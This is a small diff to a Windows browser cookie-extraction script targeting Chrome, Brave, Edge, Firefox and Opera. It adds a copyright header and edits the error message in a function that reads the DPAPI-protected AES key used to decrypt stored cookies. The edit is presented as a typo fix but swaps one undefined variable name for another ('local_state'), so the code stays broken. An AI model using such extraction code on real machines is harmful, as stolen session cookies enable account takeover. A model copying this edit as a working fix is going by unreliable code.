@@ -1,3 +1,6 @@
+# Copyright (c) 2026. Jac LL.
+# All Rights Reserved. 
+
 # Cookie extraction for WindowsOS (mainly Chrome, Brave, Edge , Firefox, Opera,etc)
 # Masterlist of extraction technique & csv
 
@@ -66,7 +69,7 @@ def chrome_time_to_unix(chrome_time):
 def get_chromium_key(local_state_path: Path) -> bytes:
     """Get the AES key from the Local State (DPAPI protected)."""
     if not local_state_path.exists():
-        raise FileNotFoundError(f"Local state now found: {local_stata_path}")
+        raise FileNotFoundError(f"Local state not found: {local_state}")
 
 
     with open(local_state_path, "r", encoding="utf-8") as f:
